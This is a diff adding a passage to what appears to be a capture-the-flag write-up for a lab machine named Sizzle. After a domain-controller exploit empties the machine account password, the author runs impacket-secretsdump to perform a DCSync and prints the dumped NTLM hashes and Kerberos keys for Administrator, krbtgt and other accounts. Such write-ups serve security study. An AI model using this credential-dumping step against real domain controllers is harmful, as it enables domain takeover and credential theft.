@@ -325,3 +325,46 @@ Result: 0
 
 Exploit complete!
 ```
+This set the DC machine account password to an empty string so now i should be able to perform a DCSync
+
+```python
+impacket-secretsdump -no-pass SIZZLE\$@10.129.19.191 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SIZZLE:4102:aad3b435b51404eeaad3b435b51404ee:dce911fab66919eac6b0e9642a664914:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
+Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
+Administrator:des-cbc-md5:ad7afb706715e964
+krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
+krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
+krbtgt:des-cbc-md5:866db35eb9ec5173
+amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
+amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
+amanda:des-cbc-md5:70ba677a4c1a2adf
+mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
+mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
+mrlky:des-cbc-md5:02f1a4da0432f7f7
+sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
+sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
+sizzler:des-cbc-md5:5d51d30e68d092d9
+SIZZLE$:aes256-cts-hmac-sha1-96:6ecf1fe4c6bf3af55197960feba8a92dd8d321e18b688006a9bb09c91725f3a7
+SIZZLE$:aes128-cts-hmac-sha1-96:f98d2b4ca1357ba73c4f7c17f104bd11
+SIZZLE$:des-cbc-md5:92bf08aee6a16129
+SIZZLE:aes256-cts-hmac-sha1-96:ed2668745f5d855178849f940922fa590ead78adfa28933b91eee6c598d405c0
+SIZZLE:aes128-cts-hmac-sha1-96:7467d76a4f41bf7ebf02fc3aa25a35eb
+SIZZLE:des-cbc-md5:15c4d3ef49efcd4f
+[*] Cleaning up...
+```
+I now have all the hashes
